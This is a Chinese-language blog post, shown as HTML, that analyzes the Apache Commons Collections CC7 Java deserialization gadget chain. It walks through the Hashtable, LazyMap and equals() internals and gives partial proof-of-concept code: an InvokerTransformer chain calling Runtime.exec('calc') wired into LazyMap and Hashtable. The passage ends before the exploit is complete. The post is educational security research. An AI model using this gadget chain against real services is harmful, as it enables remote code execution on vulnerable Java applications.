@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Okaytc" />
+  <meta name="description" content="生活 健身 学习 沉淀" />
+  
+  
+  <title>
+    
+      java安全-CC7链学习与分析 
+      
+      
+      |
+    
+     Okaytc
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/head.jpg">
+    <link rel="icon" href="/images/head.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/head.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Okaytc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">文章</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java安全-CC7链学习与分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-12-26 14:44:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    #Java安全
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/java%E5%88%A9%E7%94%A8%E9%93%BE/" title="java利用链">
+                    #java利用链
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC7的触发点同CC1一样，采用ChainedTransformer链和LazyMap类，入口点变了，跟前面CC1~6不一样，但逆向思维去分析查找链实在没办法，效果跟正向分析没啥区别了，所以主要以正向分析去学习，还是单独整理出来吧</p>
+<h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p>
+<blockquote>
+<p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
+</blockquote>
+<p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p>
+<h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+<p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p>
+<h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC7链也利用<code>ChainedTransformer</code>链和<code>LazyMap</code>类作为触发点，入口不一样，目的都是为了调用<code>lazyMap.get()</code>方法</p>
+<h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>回顾LazyMap触发点：</p>
+<ul>
+<li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li>
+<li><code>lazyMap.get()</code>方法会调用<code>ChainedTransformer.transform()</code>执行链转换器内的<code>Runtime.exec()</code>方法达到命令执行的目的。</li>
+</ul>
+<hr>
+<p>CC1~6中使用到LazyMap的链：<br>CC1（LazyMap链）：</p>
+<ul>
+<li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将<code>LazyMap</code>对象传入<code>AnnotationInvocationHandler</code>代理类。</li>
+<li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li>
+</ul>
+<hr>
+<p>CC5：</p>
+<ul>
+<li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li>
+<li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.toString()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li>
+<li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li>
+<li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li>
+</ul>
+<hr>
+<p>CC6：</p>
+<ul>
+<li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li>
+<li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.hashCode()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li>
+<li>通过使用<code>hashmap</code>的<code>put</code>方法添加元素时调用<code>hash(key)</code>方法，进而调用<code>key.hashCode()</code>方法，将<code>TiedMapEntry</code>对象作为key<code>put</code>入<code>hashmap</code>中，达到调用<code>TiedMapEntry.hashCode()</code>的目的（hashSet同理,本质上都是调用hashmap）。</li>
+</ul>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>回到<code>lazyMap.get()</code>方法本身上来，CC7使用了<code>Hashtable</code>作为入口，也就是说对<code>Hashtable</code>对象进行序列化，然后在反序列化时触发漏洞</p>
+<p>简述Hashtable哈希表:</p>
+<blockquote>
+<p>Hashtable是原始的java.util的一部分， 是一个Dictionary具体的实现 。<br>然而，Java 2 重构的Hashtable实现了Map接口，因此，Hashtable现在集成到了集合框架中。它和HashMap类很相似，但是它支持同步。<br>像HashMap一样，Hashtable在哈希表中存储键&#x2F;值对。当使用一个哈希表，要指定用作键的对象，以及要链接到该键的值。<br>然后，该键经过哈希处理，所得到的散列码被用作存储在该表中值的索引。</p>
+</blockquote>
+<p>同<code>hashmap</code>一样，都是存储键值对&lt;key,value&gt;的散列表。</p>
+<p><code>Hashtable</code>同样重写了序列化和反序列化过程</p>
+<h3 id="hashtable反序列化过程"><a href="#hashtable反序列化过程" class="headerlink" title="hashtable反序列化过程"></a>hashtable反序列化过程</h3><hr>
+<p>序列化（writeObject）过程，其实查看英文注解就大概知道这个过程了:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//声明一个Entry变量，用来临时存储读取的数据</span></span><br><span class="line">        Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="comment">//默认写入非static和transient的属性</span></span><br><span class="line">            <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">            s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入table表的长度和元素数量</span></span><br><span class="line">            <span class="comment">// Write out length, count of elements</span></span><br><span class="line">            s.writeInt(table.length);</span><br><span class="line">            s.writeInt(count);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//依次读取table表中的键值对，写入到entryStack变量中</span></span><br><span class="line">            <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">                Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                    entryStack =</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                    entry = entry.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//依次读取entryStack变量中数据，将entry里的Key和value写入</span></span><br><span class="line">        <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">        <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">            s.writeObject(entryStack.key);</span><br><span class="line">            s.writeObject(entryStack.value);</span><br><span class="line">            entryStack = entryStack.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化过程简单来说就是创建一个<code>Entry</code>类型变量<code>entryStack</code>来读取<code>table</code>中的<code>entry</code>数据，再依次读取<code>entryStack</code>中的<code>entry</code>元素中的<code>key</code>和<code>value</code>写入到流中。</p>
+<hr>
+<p>反序列化（readObject）过程</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//读取默认属性</span></span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取原始table长度和元素成员数量</span></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//重新计算table的长度</span></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        <span class="comment">//创建计算好长度的table表</span></span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取流中所有元素的key和value</span></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">//同步将key和value通过reconstitutionPut方法写入到新创建的table表中</span></span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化过程相对也比较好理解，主要就是从流中读取到原始信息，再重新计算长度去创建一个新<code>table</code>表，并读取流中<code>key</code>和<code>value</code>通过<code>reconstitutionPut</code>方法写入到<code>table</code>表中<br>反序列化过程主要只调用了<code>reconstitutionPut</code>方法，该方法比较关键，再跟进<code>reconstitutionPut</code>方法</p>
+<h3 id="reconstitutionPut"><a href="#reconstitutionPut" class="headerlink" title="reconstitutionPut()"></a>reconstitutionPut()</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样通过注解也很好理解步骤（主要就是value不允许为Null，然后key值不能重复，元素hash不能相同，也是hashtable的特性）</p>
+<ul>
+<li>先判断value值，如果value为空，就抛出序列化异常</li>
+<li>计算key的hash，再根据hash和table长度计算出存储索引index，并判断该key的hash或者该key的值是否在表中存在，如果已存在就抛出序列化异常</li>
+<li>经过判断没问题后 就将key value写入到Entry中</li>
+</ul>
+<p><code>reconstitutionPut</code>方法中调用了<code>key.hashCode()</code>方法和<code>e.key.equals(key)</code>方法，其中<code>key.hashCode()</code>方法在下面<font color="red">POC延伸</font>中会分析，现在还有<code>e.key.equals(key)</code>方法，在for循环中，判断当前元素的<code>key</code>的<code>hash</code>在表中是否存在，并且会对元素的<code>key</code>对表中元素的<code>key</code>进行<code>equals()</code>匹配查看<code>key</code>是否在表中存在。<br>跟进<code>e.key.equals(key)</code>方法，其中<code>e.key</code>表示从流中读取的<code>table</code>表中的<code>key</code>，也就是我们<code>put</code>进的<code>key</code>值。<br>该链通过<code>Hashtable</code>调用<code>Lazymap</code>，那传入的<code>key</code>值肯定就为<code>Lazymap</code>对象。<br><code>e.key.equals(key)</code>调用相当于<code>e.Lazymap.equals(key)</code></p>
+<p><font color="red">满足条件：</font></p>
+<ul>
+<li>value不能为空，设置value值就行。</li>
+<li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在table表中需要有两个元素的hash是相等的，hash相等才能获取到table中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须put进两个hash相等的元素。</li>
+</ul>
+<h3 id="AbstractMapDecorator-equals"><a href="#AbstractMapDecorator-equals" class="headerlink" title="AbstractMapDecorator.equals()"></a>AbstractMapDecorator.equals()</h3><p>跟进<code>Lazymap.equals()</code>方法，但<code>Lazymap</code>类本身没有<code>equals()</code>方法，实际是调用它的父类<code>AbstractMapDecorator</code>下的<code>equals()</code>方法</p>
+<p><img src="/posts/40ba40f0/cc7-2.png" title="AbstractMapDecorator.equals()"></p>
+<p>其中会判断<code>object</code>对象是否为同一个对象，是的话返回<code>true</code>，如果不是同一个对象，就执行<code>map.equals(object)</code>，其中的<code>map</code>为<code>Lazymap</code>传参的<code>map</code>，也就是<code>hashmap</code>对象</p>
+<p>继续跟进<code>hashmap.equals()</code>方法，同样<code>hashmap</code>本身只有在它的<code>Node</code>子类中存在<code>equals()</code>方法，实际调用的也是父类下的<code>equals()</code>方法</p>
+<h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h3><p><img src="/posts/40ba40f0/cc7-3.png" title="AbstractMap.equals()"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="comment">//判断是否是同一个对象</span></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//判断该对象是否属于Map类型</span></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="comment">//判断元素个数是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建迭代器</span></span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                <span class="comment">//依次获取元素</span></span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="comment">//获取Key和value值</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="comment">//value为空的话执行下面判断体</span></span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//value不为空的话执行下面判断体</span></span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><font color="red">满足条件：</font></p>
+<ul>
+<li>不能为同一个对象，如果两个元素相同就直接返回true</li>
+<li>该对象类型必须为Map类型，不是Map类型的话返回false</li>
+<li>对象元素个数必须相同，不同的话返回false</li>
+</ul>
+<p>满足以上条件后，由于本身<code>value</code>不能为空（为空就不会进入到这个调用阶段了），因此会执行<code>if (!value.equals(m.get(key)))</code>判断体中的<code>m.get(key)</code>方法，而<code>m</code>对象由传入的<code>Object</code>对象，也就是上面分析传入对比<code>equals()</code>方法中的对象，即<code>Lazymap</code>对象，实际调用<code>Lazymap.get(key)</code>，达到代码执行的目的。</p>
+<h3 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h3><p>上面几个关键的方法分析完了，从POC构造继续串联起来分析<br>首先触发点不变</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>接着就是<code>Lazymap</code>的传值和对<code>hashtable</code>之间的衔接，在上面方法的分析中提到<code>reconstitutionPut()</code>方法中需要满足</p>
+<ul>
+<li><code>value</code>不能为空，设置<code>value</code>值就行。</li>
+<li>需要<code>index</code>相同且<code>e.hash == hash</code>，也就是在<code>table</code>表中需要有两个元素的<code>hash</code>是相等的，<code>hash</code>相等才能获取到<code>table</code>中的元素，才能去执行<code>e.key.equals(key)</code>这个方法，因此必须<code>put</code>进两个<code>hash</code>相等的元素。</li>
+</ul>
+<p><img src="/posts/40ba40f0/cc7-4.png" title="满足条件"></p>
+<p>由上满足条件，我们传入两个相同的元素</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map Lmap2= LazyMap.decorate(map2,transformerChain);</span><br><span class="line">Lmap.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Lmap2.put(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(Lmap,<span class="number">1</span>);</span><br><span class="line">ht.put(Lmap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但会遇到问题，如果传入两个相同的元素，由于<code>hashtable</code>的<code>put</code>操作</p>
+<p><img src="/posts/40ba40f0/cc7-5.png" title="put()"></p>
+<p>其中针对第一个元素<code>put</code>入的时候，此时<code>Table</code>不存在其他元素，此时<code>index</code>指针获取的<code>table</code>为<code>null</code>，不会进入<code>for</code>循环体，直接进入<code>addEntry()</code>方法中</p>
+<p><img src="/posts/40ba40f0/cc7-6.png" title="addEntry()"></p>
+<p><code>addEntry()</code>方法将元素添加对应元素<code>hash</code>计算出来的<code>index</code>指针的<code>table</code>中，最后计数+1，表示<code>table</code>中新增了一个元素个数</p>
+<p>如果添加两个一模一样的元素，就会导致在第二次<code>put</code>对象时，由于<code>hash</code>相同，计算的<code>index</code>相同，<code>key</code>值相同，进入到<code>put</code>方法的<code>for</code>循环中返回了，自然不会进行<code>addEntry()</code>添加操作，此时<code>table</code>表中元素个数仍为1。</p>
+<p><img src="/posts/40ba40f0/cc7-12.png" title="第二次put"></p>
+<p>在反序列化获取<code>elements</code>元素个数时，此时也为1，只进行一次<code>reconstitutionPut</code>方法调用。而需要调用第二次<code>reconstitutionPut</code>方法，判断里面的<code>hash</code>相同才能运行到<code>e.key.equals(key)</code>方法。</p>
+<p><img src="/posts/40ba40f0/cc7-7.png" title="反序列化过程"></p>
+<p>因此需要我们传入两个元素的hash相同，但是元素key不相同的两组元素</p>
+<p>由上满足条件，我们传入两个元素的hash相同，但是元素key不相同的两组元素</p>
